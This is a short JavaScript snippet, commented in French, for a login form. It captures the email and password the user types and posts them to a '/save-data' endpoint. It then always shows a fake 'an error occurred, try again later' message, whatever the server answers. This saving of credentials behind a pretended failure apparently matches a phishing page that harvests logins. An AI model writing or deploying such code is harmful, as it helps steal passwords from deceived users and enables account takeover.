document.getElementById("loginForm").addEventListener("submit", function(event) {
    event.preventDefault();  // Empêche le rechargement de la page

    const email = document.getElementById("email").value;
    const password = document.getElementById("password").value;

    // Envoie les données au serveur
    fetch('/save-data', {
        method: 'POST',
        headers: {
            'Content-Type': 'application/json'
        },
        body: JSON.stringify({ email, password })
    })
    .then(response => response.text())
    .then(data => {
        document.getElementById("loginBox").innerHTML = `
            <h1>Connexion</h1>
            <p class="error-message">Une erreur est survenue, réessayez plus tard.</p>
        `;
    })
    .catch(error => {
        console.error('Erreur:', error);
    });
});
